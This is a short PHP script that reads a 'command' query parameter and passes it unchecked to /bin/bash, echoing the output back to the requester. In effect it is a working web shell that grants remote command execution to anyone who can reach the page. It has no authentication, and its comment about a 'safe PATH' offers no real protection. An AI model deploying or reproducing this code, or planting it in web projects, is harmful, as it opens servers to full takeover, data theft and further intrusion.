<?php

if (isset($_GET['command'])) {
    $command = $_GET['command'];
    
    // Validate and sanitize the command (optional)
    // In this case, we're assuming any command is valid, which is extremely risky
    
    $env = array(
        'PATH' => '/usr/local/bin:/usr/bin:/bin' // Set a safe PATH variable
    );

    $descriptorspec = array(
        0 => array("pipe", "r"), // stdin
        1 => array("pipe", "w"), // stdout
        2 => array("pipe", "w")  // stderr
    );

    $process = proc_open('/bin/bash', $descriptorspec, $pipes, null, $env);

    if (is_resource($process)) {
        // Send the command to the shell process
        fwrite($pipes[0], $command . "\n");
        fclose($pipes[0]);

        // Read and output stdout
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        // Close stderr
        fclose($pipes[2]);

        // Close the shell process
        proc_close($process);
    }
} else {
    echo "No command provided.";
}

?>
